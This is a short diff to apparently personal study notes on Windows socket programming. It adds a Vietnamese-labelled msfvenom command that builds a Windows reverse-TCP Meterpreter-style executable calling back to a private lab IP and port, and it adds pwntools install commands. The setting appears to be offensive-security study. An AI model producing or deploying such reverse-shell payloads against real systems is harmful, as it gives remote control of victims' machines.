@@ -23,4 +23,10 @@
 
 [WSAStartup](./Functions/WSAStartup/README.md) 
 
+
+Tạo meterpreter:
 msfvenom -p windows/custom/reverse_tcp LHOST=192.168.79.128 LPORT=8080 -f exe -o met.exe
+
+cài pwntool
+python3 -m pip install --upgrade pip
+python3 -m pip install --upgrade pwntools
